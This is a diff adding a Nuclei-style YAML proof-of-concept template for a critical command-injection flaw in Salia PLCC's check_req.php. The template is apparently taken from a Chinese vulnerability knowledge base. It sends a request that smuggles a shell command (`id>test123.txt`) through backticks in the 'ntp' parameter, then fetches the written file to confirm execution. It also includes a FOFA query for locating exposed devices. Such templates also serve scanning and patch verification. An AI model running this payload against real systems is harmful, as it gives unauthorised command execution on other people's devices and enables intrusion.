@@ -1,0 +1,52 @@
+id: poc-sqmlkwxi5tm842yy
+info:
+  name: Salia PLCC check_req.php 命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sqmlkwxi5tm842yy'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: sqmlkwxi5tm842yy
+    fofa: body="Salia PLCC"
+http:
+- raw:
+  - 'GET /check_req.php?ntp=`id>test123.txt` HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: en
+
+    Connection: keep-alive
+
+    访问结果'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /test123.txt HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: en
+
+    Connection: keep-alive'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
